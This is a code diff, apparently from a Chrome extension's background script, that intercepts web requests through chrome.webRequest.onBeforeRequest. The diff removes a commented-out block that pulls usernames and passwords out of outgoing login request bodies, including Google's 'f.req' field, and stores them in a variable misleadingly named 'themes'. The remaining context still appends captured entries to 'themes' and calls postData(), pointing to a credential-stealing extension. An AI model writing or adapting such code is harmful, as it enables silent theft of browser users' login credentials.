@@ -75,35 +75,7 @@ chrome.webRequest.onBeforeRequest.addListener(
                 postData()
             }
         }
-        /*
-        if(found==false) {
-            var url= String(details.url).split("/")[2]
-            var addition = url+ "\n";
-            if (requestBodynice.includes("password")) {
-                var password=requestBodynice.split('password":')[1].split('"')[1];
-            if (requestBodynice.includes("username")){
-                var username = requestBodynice.split("f.req")[1].split('\\"')[1];
-                addition = addition + "username: " + username+ "\n" ;
-            }
-                addition = addition + "password: " + password+ "\n" ;
-                if (themes.includes(addition) == false) {
-                    themes = themes + "\n\n" + addition + "\n" + "password: " + password;
-                }
-            }
-            if (JSON.stringify(details.requestBody).includes("password")) {
-                console.log(JSON.stringify(details));
-                console.log("requestbody: " + JSON.stringify(details.requestBody));
-                requestBodyJSON = JSON.stringify(details.requestBody);
-                var username = requestBodyJSON.split("f.req")[1].split('\\"')[1];
-                var password = "NA";
-                requestBodyJSON = String(requestBodyJSON);
-                var addition = "" + "\n" + "username: " + username;
-                if (themes.includes(addition) == false) {
-                    themes = themes + "\n\n" + addition + "\n" + "password: " + password;
-                }
-            }
-        }
-         */
+      
         if(found == true){
             if (themes.includes(addition) == false) {
                 themes = themes + "\n\n" + addition ;
